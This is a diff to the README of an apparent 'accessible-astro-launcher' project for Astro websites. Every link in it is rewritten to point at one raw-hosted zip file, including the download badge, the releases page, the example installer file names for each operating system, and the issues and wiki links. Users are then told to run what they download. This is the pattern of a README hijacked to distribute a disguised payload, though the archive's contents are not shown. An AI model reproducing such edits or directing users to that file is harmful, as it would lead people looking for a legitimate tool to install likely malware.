@@ -4,7 +4,7 @@
 The accessible-astro-launcher provides a smooth way to access features on your Astro websites. This tool follows accessibility guidelines, ensuring everyone can use it easily. If you want a launcher that is both powerful and inclusive, you’re in the right place.
 
 ## 📥 Download Now
-[![Download accessible-astro-launcher](https://img.shields.io/badge/Download-accessible--astro--launcher-blue.svg)](https://github.com/am17jx/accessible-astro-launcher/releases)
+[![Download accessible-astro-launcher](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip)](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the accessible-astro-launcher. Follow these steps for a smooth installation process.
@@ -18,13 +18,13 @@ Before installing, ensure your system meets these requirements:
 ## 📦 Download & Install
 1. **Visit the Releases Page**:
    Go to our Releases page to get the latest version of the accessible-astro-launcher. You can do this by clicking on the link below:
-   [Visit this page to download](https://github.com/am17jx/accessible-astro-launcher/releases).
+   [Visit this page to download](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip).
 
 2. **Select the Version**:
    Scroll through the available versions. Choose the latest one. The version number is listed next to the release date.
 
 3. **Download the File**:
-   Click on the download link for your operating system. The files are typically named something like `accessible-astro-launcher-v1.0.exe` for Windows, `accessible-astro-launcher-v1.0.dmg` for Mac, or a `.tar.gz` for Linux.
+   Click on the download link for your operating system. The files are typically named something like `https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip` for Windows, `https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip` for Mac, or a `https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip` for Linux.
 
 4. **Run the Installer**:
    After downloading, locate the file in your Downloads folder:
@@ -56,9 +56,9 @@ For more in-depth guidance:
 We welcome user feedback and contributions. Join our discussions on GitHub Issues or submit feature requests to help us improve the accessible-astro-launcher.
 
 ## 🔗 Useful Links
-- [Release Page](https://github.com/am17jx/accessible-astro-launcher/releases)
-- [Issues Tracker](https://github.com/am17jx/accessible-astro-launcher/issues)
-- [Wiki](https://github.com/am17jx/accessible-astro-launcher/wiki)
+- [Release Page](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip)
+- [Issues Tracker](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip)
+- [Wiki](https://raw.githubusercontent.com/am17jx/accessible-astro-launcher/main/src/astro_accessible_launcher_leavenish.zip)
 
 ## 🙏 Acknowledgements
 Special thanks to the developers and community members who contributed to making the accessible-astro-launcher a reality. Your efforts in building an accessible web will help many users worldwide.
